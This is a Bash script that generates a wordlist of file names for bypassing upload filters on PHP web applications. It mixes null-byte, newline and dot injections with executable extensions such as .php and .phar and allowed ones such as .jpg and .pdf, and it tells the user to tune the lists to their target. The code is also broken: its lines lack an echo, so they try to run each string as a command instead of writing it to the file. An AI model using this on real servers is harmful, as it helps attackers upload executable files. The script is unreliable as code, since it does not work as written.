# This BASH script will perform character injection to auto generate a wordlist and bypass server-side validations
# This script is by-default for PHP based apps. Please change the extensions list in Line #4 according to the back-end technology being used by your target.
# This script is by-default for apps that allow JPG, PNG, XLS, PDF, GIF files. Please change the allowed extensions list in Line #5 according to the back-end technology being used by your target.

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phtml' '.php7' '.phar'; do # change here the list of extensions according to back-end technology
      for ext1 in '.jpg' '.png' '.xls' '.pdf' '.gif'; do # change here the list of allowed extensions
          $char$char$char >> wordlist.txt
          $char$char$ext >> wordlist.txt
          $char$ext$ext1 >> wordlist.txt
          $ext$ext$char >> wordlist.txt
          $ext$ext1$ext >> wordlist.txt
          $ext$ext1$ext1 >> wordlist.txt
          $ext1$char$char >> wordlist.txt
          $ext1$ext$ext >> wordlist.txt
          $ext1$ext1$ext1 >> wordlist.txt
      done
    done
done
cat wordlist.txt | sort -u > wordlist-for-file-upload.txt
echo "File saved as wordlist-for-file-upload.txt"
